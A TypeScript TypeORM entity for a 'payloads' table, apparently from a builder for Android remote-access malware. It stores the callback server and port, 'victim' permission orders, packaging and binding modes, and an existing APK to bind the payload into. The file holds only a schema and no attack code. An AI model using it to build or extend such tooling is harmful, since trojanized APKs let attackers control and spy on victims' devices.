import { Exclude } from 'class-transformer';
import { Column, Entity, OneToMany } from 'typeorm';

import {
    BindingMethod,
    PackagingMode,
    PayloadStatus,
    type VictimOrder,
} from '../../common/enums';
import { type IPayloadEntity } from '../../common/interfaces';
import { BaseEntity } from './BaseEntity';
import { PayloadLogEntity } from './PayloadLogEntity';

@Entity('payloads')
export class PayloadEntity extends BaseEntity implements IPayloadEntity {
    @Column()
    public server!: string;

    @Column()
    public port!: number;

    @Column({ type: 'simple-array' })
    public permissions!: VictimOrder[];

    @Column({ type: 'simple-enum', enum: PackagingMode })
    public packagingMode!: PackagingMode;

    @Column({ type: 'simple-enum', enum: BindingMethod })
    public bindingMethod!: BindingMethod;

    @OneToMany(() => PayloadLogEntity, (log) => log.payload, {
        eager: true,
        cascade: true,
    })
    public logs!: PayloadLogEntity[];

    @Column({ type: 'simple-enum', enum: PayloadStatus })
    public status!: PayloadStatus;

    @Exclude()
    @Column({ nullable: true })
    public existingAPK?: string;

    @Column({ nullable: true })
    public existingAPKName?: string;
}
